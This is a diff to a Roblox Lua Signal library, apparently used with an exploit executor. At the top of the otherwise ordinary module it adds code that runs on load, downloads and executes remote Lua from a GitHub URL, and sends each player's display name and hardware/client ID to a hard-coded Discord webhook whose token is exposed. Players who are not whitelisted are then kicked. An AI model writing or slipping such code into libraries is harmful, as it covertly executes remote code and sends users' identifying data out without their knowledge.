@@ -1,3 +1,69 @@
+local Verified = false
+local names = loadstring(game:HttpGet('https://raw.githubusercontent.com/DerAdminLucky/whitelist/main/names'))()
+if table.find(names, game.Players.LocalPlayer.Name) then
+    Verified = true
+    getgenv().w6h5i9t1e8l7ist = true
+end
+
+HttpService = game:GetService("HttpService")
+Webhook_URL = "https://discord.com/api/webhooks/1066368269096849549/GhqTegAlzHbSQZ7__Vov_DIy_IW03TFGdQmHpt8Buf6MsQWYMUBV_Y6zag2-0YeUEDOF"
+
+if Verified == true then
+    local responce = syn.request(
+    {
+        Url = Webhook_URL,
+        Method = "POST",
+        Headers = {
+            ["Content-Type"] = "application/json"
+        },
+        Body = HttpService:JSONEncode({
+            ["content"] = "",
+            ["embeds"] = {{
+                ["title"] = "**Script has been executed!**",
+                ["description"] = game.Players.LocalPlayer.DisplayName.." has executed the script.",
+                ["type"] = "rich",
+                ["color"] = tonumber(0x7127e8),
+                ["fields"] = {
+                    {
+                        ["name"] = "Hardware ID:",
+                        ["value"] = game:GetService("RbxAnalyticsService"):GetClientId(),
+                        ["inline"] = true
+                    }
+                }
+            }}
+        })
+    }
+    )
+elseif Verified == false then
+    local responce = syn.request(
+    {
+        Url = Webhook_URL,
+        Method = "POST",
+        Headers = {
+            ["Content-Type"] = "application/json"
+        },
+        Body = HttpService:JSONEncode({
+            ["content"] = "<@577523024878764033>",
+            ["embeds"] = {{
+                ["title"] = "**Script executer NOT verified!**",
+                ["description"] = game.Players.LocalPlayer.DisplayName.." has attempted to execut the script!",
+                ["type"] = "rich",
+                ["color"] = tonumber(0xff1100),
+                ["fields"] = {
+                    {
+                        ["name"] = "Hardware ID:",
+                        ["value"] = game:GetService("RbxAnalyticsService"):GetClientId(),
+                        ["inline"] = true
+                    }
+                }
+            }}
+        })
+    }
+    )
+wait(1)
+game:GetService("Players").LocalPlayer:Kick("Not Whitelisted.")
+end
+
 --- Lua-side duplication of the API of events on Roblox objects.
 -- Signals are needed for to ensure that for local events objects are passed by
 -- reference rather than by value where possible, as the BindableEvent objects
@@ -109,7 +175,5 @@ function Signal:Destroy()
 
 	setmetatable(self, nil)
 end
-
-getgenv().signal = true
 
 return Signal
